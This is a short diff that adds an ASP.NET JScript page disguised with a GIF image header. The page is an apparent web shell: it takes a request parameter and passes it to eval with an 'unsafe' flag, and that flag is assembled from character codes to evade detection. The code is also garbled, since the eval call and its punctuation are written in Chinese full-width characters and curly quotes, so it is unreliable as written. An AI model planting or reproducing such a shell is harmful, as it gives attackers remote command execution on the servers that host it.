@@ -1,0 +1,7 @@
+gif89a^^<%@ Page Language="Jscript"%>
+<%
+var a = Request.Item["M"];
+var b = "un" + Char(115) + Char(97) + "fe";//
+评估（a，b）；
+Response.Write(“测试”);
+%>
